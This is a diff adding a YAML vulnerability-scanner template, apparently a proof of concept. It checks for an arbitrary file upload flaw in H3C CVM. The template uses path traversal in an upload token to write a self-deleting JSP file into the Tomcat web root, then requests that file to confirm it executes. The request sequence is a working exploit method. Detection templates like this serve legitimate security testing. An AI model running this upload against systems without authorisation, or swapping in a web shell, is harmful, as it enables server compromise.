@@ -1,0 +1,34 @@
+name: yaml-poc-h3c-cvm-file_upload-CT-479112
+binding: 3dad90cb-2418-409f-8a68-bf332fee46c6
+detail:
+    author: system_user
+    links:
+        - https://github.com/MY0723/goby-poc/blob/goby-poc/H3C%20CVM%20Arbitrary%20File%20Upload%20Vulnerability.go
+    vulnerability:
+        id: 578be4ce-ef7f-4035-a185-07da9f739875
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    a: randomLowercase(20)
+    b: request.url
+    c: randomLowercase(10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{c}}.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Content-range: bytes 0-10/20
+                Referer: '{{b}}cas/login'
+            body: <%out.println("{{a}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        expression: response.status == 200 && response.body.bcontains(b"success") && response.headers["Content-Type"].contains("application/json") && response.headers["Server"].contains("H3C-CVM")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /cas/js/lib/buttons/{{c}}.jsp
+        expression: response.status == 200 && response.body.bstartsWith(bytes(a))
+expression: r0() && r1()
